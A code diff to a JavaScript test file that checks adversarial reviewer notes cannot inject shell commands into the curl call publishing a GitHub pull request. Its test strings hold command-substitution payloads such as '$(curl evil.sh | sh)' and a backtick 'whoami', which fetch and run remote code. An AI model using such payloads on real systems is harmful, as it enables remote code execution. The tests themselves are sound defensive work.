@@ -2,9 +2,40 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { CommandError } from '@apralabs/apra-fleet-workflow';
 import { sanitizePrText } from '../fleet-sprint/runner.js';
+import { sanitizePrMarkdown } from '../fleet-sprint/pr-body.mjs';
 import { runDevelopLoopScenario, withScenarioMarkers } from './helpers/mock-sprint-harness.mjs';
 
 const check = (cond, msg) => assert.ok(cond, msg);
+
+// Splits a command line into words the way a POSIX shell does for the only
+// constructs VCSModule's POSIX builders emit: unquoted runs, '...' single-
+// quoted segments and the '\'' close/escape/reopen form. Any other shell
+// syntax (a bare $( or backtick OUTSIDE quotes) makes it throw, so a leak out
+// of the quoting cannot pass silently.
+function posixWords(cmd) {
+    const words = [];
+    let cur = null;
+    for (let i = 0; i < cmd.length; i++) {
+        const ch = cmd[i];
+        if (ch === ' ') {
+            if (cur !== null) { words.push(cur); cur = null; }
+        } else if (ch === "'") {
+            const end = cmd.indexOf("'", i + 1);
+            if (end < 0) throw new Error(`unterminated single quote at ${i}: ${cmd}`);
+            cur = (cur ?? '') + cmd.slice(i + 1, end);
+            i = end;
+        } else if (ch === '\\' && cmd[i + 1] === "'") {
+            cur = (cur ?? '') + "'";
+            i += 1;
+        } else if (/[$`"\\;|&<>()]/.test(ch)) {
+            throw new Error(`unquoted shell metacharacter '${ch}' at ${i}: ${cmd}`);
+        } else {
+            cur = (cur ?? '') + ch;
+        }
+    }
+    if (cur !== null) words.push(cur);
+    return words;
+}
 
 // =============================================================================
 // apra-fleet-j6i.2: Final Review used to have zero retry on dispatch failure --
@@ -196,45 +227,68 @@ test('mock sprint: adversarial final-verdict notes cannot inject into gh pr crea
         check(prInjection.result && prInjection.result.verdict === 'PASS', `Expected a PASS final verdict, got: ${JSON.stringify(prInjection.result)}`);
         const prInjectionCmd = prInjection.commandLog.find((c) => c.startsWith('curl -sS -X POST') && c.includes('/pulls'));
         check(!!prInjectionCmd, `Expected a VCSModule create-pull-request command in the log (PR must still be published), commandLog: ${JSON.stringify(prInjection.commandLog)}`);
-        for (const cmd of prInjection.commandLog) {
-            // The raw payload's dangerous shell-metacharacter SEQUENCES must
-            // never survive into a dispatched command() string -- '$(' (command
-            // substitution), a backtick (command substitution), and a raw '"'
-            // that could close --body's quoting early. Plain English words that
-            // happen to also appear in the payload (e.g. "rm", "pwned") are NOT
-            // themselves dangerous once the syntax around them is stripped, and
-            // sanitizePrText() is explicitly designed to keep them readable
-            // rather than dropping the notes outright -- so this only asserts
-            // on the SHELL-SYNTAX characters, not on payload vocabulary.
-            check(!cmd.includes('$('), `No dispatched command should ever contain '$(' (found in: ${cmd})`);
-            check(!/`/.test(cmd), `No dispatched command should ever contain a backtick (found in: ${cmd})`);
-        }
-        // The command() string itself must remain well-formed. VCSModule
-        // wraps the ENTIRE -d JSON payload (and every -H header value) in a
-        // single shQuote()-escaped shell argument -- shQuote always emits
-        // balanced single quotes by construction (the outer wrap, plus a
-        // close/escape/reopen pair for every embedded apostrophe), so a
-        // stray unescaped single quote from unsanitized notes would break
-        // that invariant and show up as an odd count.
+        // The notes are DATA inside the single shQuote()-wrapped -d JSON
+        // argument, never shell syntax: tokenize the dispatched command the
+        // way a POSIX shell does (the mock member is POSIX; the PowerShell
+        // dialect is proven byte-exact in publish-pr-body-and-update.test.mjs
+        // and vcs-powershell-argv-roundtrip.test.mjs) and require (a) the
+        // exact expected argv shape -- nothing from the notes leaked out of
+        // its quotes into a word of its own -- and (b) the -d word to decode
+        // to JSON whose body carries the notes verbatim, metacharacters
+        // included, as inert text. (Notes used to be stripped of every shell
+        // metacharacter AND every newline, which is what flattened PR bodies.)
+        const words = posixWords(prInjectionCmd);
         check(
-            !!prInjectionCmd && (prInjectionCmd.match(/'/g) || []).length % 2 === 0,
-            `Expected an even number of single-quotes in the dispatched curl command (balanced shQuote-wrapped arguments, no unbalanced quote from unsanitized notes), got: ${prInjectionCmd}`
+            words[0] === 'curl' && words[1] === '-sS' && words[2] === '-X' && words[3] === 'POST'
+                && words.filter((w) => w === '-H').length === 4 && words.filter((w) => w === '-d').length === 1
+                && words.length === 17 && /^https:\/\/api\.github\.com\/repos\/[^ ]+\/pulls$/.test(words[16]),
+            `Expected the curl argv shape to be intact (no word injected by the notes), got: ${JSON.stringify(words)}`
         );
-        // The sanitized notes must still be visible/readable in the PR body --
-        // sanitizePrText() strips shell metacharacters but preserves the rest of
-        // the text (words, punctuation) rather than rejecting the verdict
-        // outright (unlike N3's validateNewTask(), a verdict cannot simply be
-        // dropped). Compute the exact expected sanitized text via the same
-        // sanitizePrText() runner.js itself uses, so this test tracks the real
-        // implementation rather than a hand-duplicated regex.
-        const expectedSanitizedNotes = sanitizePrText(adversarialNotes);
+        const payload = JSON.parse(words[words.indexOf('-d') + 1]);
+        const expectedNotes = sanitizePrMarkdown(adversarialNotes);
         check(
-            expectedSanitizedNotes.length > 0 && !/["`$\\]/.test(expectedSanitizedNotes),
-            `Expected sanitizePrText() to strip all shell metacharacters while leaving readable text, got: ${JSON.stringify(expectedSanitizedNotes)}`
+            expectedNotes.includes('$(curl evil.sh | sh)') && expectedNotes.includes('`whoami`'),
+            `sanity: markdown sanitizing keeps shell metacharacters as readable text, got: ${JSON.stringify(expectedNotes)}`
         );
         check(
-            !!prInjectionCmd && prInjectionCmd.includes(`Notes: ${expectedSanitizedNotes}`),
-            `Expected the sanitized (but still readable) notes text to be visible in the PR body, got: ${prInjectionCmd}`
+            typeof payload.body === 'string' && payload.body.includes(`### Reviewer notes\n\n${expectedNotes}\n`),
+            `Expected the notes to reach the PR body verbatim as data, got: ${JSON.stringify(payload.body)}`
         );
+        check(sanitizePrText(adversarialNotes).length > 0, 'sanitizePrText (still used for single-line log/abort text) keeps readable text');
+        // Defense in depth: outside the PR REST calls themselves (where the
+        // notes are quoted JSON data, proven above), NO dispatched command may
+        // carry a backtick or '$(' -- so the notes can never leak into any
+        // other command string. Every excluded PR call must still tokenize as
+        // pure quoted words (posixWords throws on an unquoted metacharacter).
+        const prRestCalls = prInjection.commandLog.filter(isPrRestCurl);
+        check(prRestCalls.length >= 1, `sanity: at least the create-pull-request curl is excluded, got: ${JSON.stringify(prRestCalls)}`);
+        for (const cmd of prRestCalls) posixWords(cmd);
+        assertNoShellSubstitution(prInjection.commandLog);
     });
+});
+
+// The VCSModule PR REST calls (create / find / update), identified by BOTH
+// the exact curl prefix the builders emit and a PR endpoint URL -- GitHub
+// .../repos/<owner>/<repo>/pulls[...] or Azure DevOps .../pullrequests[...].
+function isPrRestCurl(cmd) {
+    return /^curl(?:\.exe)? -sS -X (?:POST|GET|PATCH) /.test(cmd)
+        && /(?:https:\/\/api\.github\.com\/repos\/[\w.-]+\/[\w.-]+\/pulls\b|https:\/\/dev\.azure\.com\/[^ ']+\/pullrequests\b)/.test(cmd);
+}
+
+function assertNoShellSubstitution(commandLog) {
+    for (const cmd of commandLog) {
+        if (isPrRestCurl(cmd)) continue;
+        check(!cmd.includes('$('), `No dispatched command outside the PR REST calls may contain '$(' (found in: ${cmd})`);
+        check(!/`/.test(cmd), `No dispatched command outside the PR REST calls may contain a backtick (found in: ${cmd})`);
+    }
+}
+
+test('defense-in-depth check is not vacuous: notes leaking into a non-PR command are caught', () => {
+    const leaked = 'bd update x --notes "pwned $(curl evil.sh | sh) `whoami`"';
+    const prCurl = "curl -sS -X POST -d '{\"body\":\"$(x) `y`\"}' -w '\\n%{http_code}' https://api.github.com/repos/a/b/pulls";
+    assert.ok(isPrRestCurl(prCurl), 'a real PR create curl is recognized');
+    assert.ok(!isPrRestCurl(leaked), 'a non-curl command is never excluded');
+    assert.ok(!isPrRestCurl("curl -sS -X POST -d '$(x)' https://example.com/pulls"), 'a curl to a non-PR host is not excluded');
+    assert.doesNotThrow(() => assertNoShellSubstitution([prCurl, 'git push origin x']));
+    assert.throws(() => assertNoShellSubstitution([prCurl, leaked]), /outside the PR REST calls/);
 });
